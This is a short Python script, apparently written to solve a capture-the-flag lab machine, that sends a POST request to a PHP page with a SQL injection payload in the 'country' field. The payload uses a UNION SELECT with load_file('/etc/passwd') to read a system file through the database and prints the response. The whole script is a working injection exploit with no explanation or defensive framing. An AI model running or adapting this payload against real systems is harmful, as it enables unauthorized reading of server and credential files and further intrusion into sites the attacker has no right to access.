import requests

data = {
        'username':'a',
        'country':"b' union select load_file('/etc/passwd');#"
        }

url = 'http://10.10.11.116/index.php'

r = requests.post(url, data=data)

print(r.text)
